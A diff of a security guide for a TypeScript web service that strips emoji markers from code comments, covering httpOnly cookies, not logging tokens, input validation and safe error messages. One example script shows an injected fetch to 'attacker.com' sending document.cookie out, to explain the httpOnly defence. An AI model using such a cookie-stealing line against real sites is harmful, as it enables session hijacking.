@@ -351,11 +351,11 @@ reply.setCookie('access_token', token, {
 <!-- Attacker injects malicious script -->
 <script>
 	// Try to steal token
-	console.log(document.cookie); // ❌ Cannot see httpOnly cookies
+	console.log(document.cookie); //  Cannot see httpOnly cookies
 
 	// Try to send token
 	fetch('https://attacker.com/steal?token=' + document.cookie);
-	// ❌ Token not in document.cookie
+	//  Token not in document.cookie
 </script>
 ```
 
@@ -427,35 +427,35 @@ reply.setCookie('access_token', token, {
 ### 2. Never Log Sensitive Data
 
 ```typescript
-// ❌ BAD: Logs token
+//  BAD: Logs token
 console.log('User logged in:', { userId, accessToken });
 
-// ✅ GOOD: No sensitive data
+//  GOOD: No sensitive data
 console.log('User logged in:', { userId });
 ```
 
 ### 3. Validate All Input
 
 ```typescript
-// ✅ Use Zod schemas
+//  Use Zod schemas
 const CreateTaskSchema = z.object({
 	name: sanitizedString('Name required'),
 	priority: positiveNumber(),
 });
 
-// ❌ Never trust raw input
+//  Never trust raw input
 const { name } = request.body; // Unsafe!
 ```
 
 ### 4. Handle Errors Securely
 
 ```typescript
-// ❌ BAD: Leaks implementation details
+//  BAD: Leaks implementation details
 catch (error) {
   throw new Error(`Database query failed: ${error.message}`);
 }
 
-// ✅ GOOD: Generic error message
+//  GOOD: Generic error message
 catch (error) {
   console.error('[Internal] Database error:', error);
   throw new Error('Failed to create task');
